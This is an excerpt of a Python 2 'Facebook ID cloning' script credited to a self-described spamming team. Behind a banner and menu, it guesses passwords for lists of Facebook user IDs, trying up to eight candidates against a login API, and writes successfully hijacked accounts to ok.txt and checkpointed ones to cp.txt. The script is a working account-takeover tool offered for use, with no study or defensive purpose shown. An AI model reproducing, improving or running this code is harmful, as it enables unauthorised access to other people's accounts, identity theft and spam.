...
print '\x1b[0;97m[!]Wait a moment Checking Network and License [Make By SIAM VAU]'
try:
...
try:
    requests.get('https://www.facebook.com/Tera.Nextp')
    requests.get('https://youtube.com/channel/UCAfNnxu3u7qHspmpm9zgk6g')
...
def logo():
    os.system('echo "\n____ ___    _    __  __\n/ ___|_ _|  / \  |  \/  |\n\___ \| |  / _ \ | |\/| |\n ___) | | / ___ \| |  | |\n|____/___/_/   \_\_|  |_|\n--------------------------------------------\nAuthor  : SIAM VAU-Z\nGithub  : https://github.com/picchi24\nFb ID  : https://www.facebook.com/Tera.Nextp\n--------------------------------------------\n[SIAM VAU-Z AND ZIHAD]\n------------------------------------------\n--------------------------------------------\n[GAJIPUR SPAMMING TEAM IS A BRAND]\n  --------------------------- [TAMIM BHUIYAN]\n---------------------------------------------" | lolcat -a -d 2 -s 50')
...
def main():
    ...
    print ''
    print '\x1b[97;1m  [1] PUBLIC AND FOLLOWER CLONING CREATE BY- (SIAM AND ZIHAD)\x1b[92;1m(Login)'
    print '\x1b[97;1m  [2] 2004 RANDOM OLD ID CLONING CREATE BY-(SIAM AND ZIHAD)\x1b[92;1m(W-Login)'
    print '\x1b[97;1m  [3] 2009 RANDOM OLD ID CLONING CREATE BY-(SIAM AND ZIHAD)\x1b[92;1m(W-Login)'
...
def log_sel():
    ...
    if sel == '':
        ...
        subprocess.check_output(['am', 'start', 'https://www.facebook.com/Tera.Nextp'])
        main()
...
def token():
    ...
    try:
        ...
        logo()
        print ''
        print '\t\x1b[98;1m  LOGIN TOKEN  CREATE BY-(SIAM AND ZIHAD)'
        print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in data.json()['error_msg']:
                print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                data = requests.get(api, params=params, headers=headers_)
                if 'access_token' in data.text and 'EAAA' in data.text:
                    print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in data.json()['error_msg']:
                    print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    data = requests.get(api, params=params, headers=headers_)
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in data.json()['error_msg']:
                        print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        data = requests.get(api, params=params, headers=headers_)
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in data.json()['error_msg']:
                            print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            data = requests.get(api, params=params, headers=headers_)
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in data.json()['error_msg']:
                                print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                data = requests.get(api, params=params, headers=headers_)
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in data.json()['error_msg']:
                                    print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    data = requests.get(api, params=params, headers=headers_)
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in data.json()['error_msg']:
                                        print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        data = requests.get(api, params=params, headers=headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[SIAM VAU-Z] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;37m[SIAM VAU-Z] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
